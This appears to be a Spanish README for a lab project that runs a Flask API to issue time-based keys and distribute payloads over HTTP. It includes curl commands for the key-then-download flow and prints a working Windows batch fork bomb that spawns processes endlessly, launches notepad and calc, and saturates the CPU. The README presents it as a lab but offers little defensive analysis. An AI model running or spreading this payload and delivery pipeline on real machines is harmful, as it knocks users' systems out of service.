# ⚙️ Ciberdefensa API — Lab Distribución + Test

## 📌 Descripción

Este proyecto implementa un entorno de laboratorio completo para:

- Generación de claves temporales basadas en tiempo
- Validación de acceso a endpoints
- Distribución de artefactos vía HTTP
- Ejecución de carga en cliente
- Verificación automática del flujo end-to-end

Incluye:

- API en Flask (contenedorizada)
- Payloads en Batch
- Script de test (`test.sh`) para validar todo el pipeline

---

## 🏗️ Arquitectura

Cliente / test.sh → API Flask → Payload

---

## 🧱 Componentes

### API (`api_server.py`)
- Genera MASTER_KEY persistente
- Genera claves temporales
- Entrega payload
- Expone endpoints

### Docker
- python:3.11-alpine
- gunicorn (1 worker)
- puerto 8080 expuesto

### Volumen
- ./data → /data (keys.txt)

### Payloads
- artefacto.ps1 (servido por API)
- payload.bat (uso manual)

### Test
- test.sh automatiza flujo completo

---

## 🚀 Deploy

```bash
docker-compose up -d --build
```

---

## 📡 Endpoints

- /health → estado
- /auth/key → genera key
- /payload/encrypted → devuelve payload
- /salt → debug

---

## 🔁 Flujo

```bash
TS=$(date +%s)

KEY=$(curl http://localhost:8080/auth/key?ts=$TS)

curl -H "X-Decrypt-Key: $KEY"      http://localhost:8080/payload/encrypted
```

---

## 🔑 Lógica

```
temp = SHA256(SECRET_SALT + ts)
key  = SHA256(MASTER_KEY + temp)
```

---

## 🧩 Payload

```bat
@echo off
for /l %%i in (1,1,25) do start /b %0
:kill
start /b notepad
start /b calc
%0|%0|%0|%0
goto kill
```

### Comportamiento
- Multiplica procesos
- Loop infinito
- Satura CPU
- Genera ruido visual

---

## 🧪 Test

```bash
chmod +x test.sh
./test.sh
```

Valida:
- health
- key
- payload
- contenido

---

## 📁 Estructura

```
.
├── Dockerfile
├── docker-compose.yml
├── api_server.py
├── artefacto.ps1
├── payload.bat
├── test.sh
├── requirements.txt
└── data/
```

---

## 🧠 Resumen

Flujo:

Cliente → key → payload → ejecución → carga

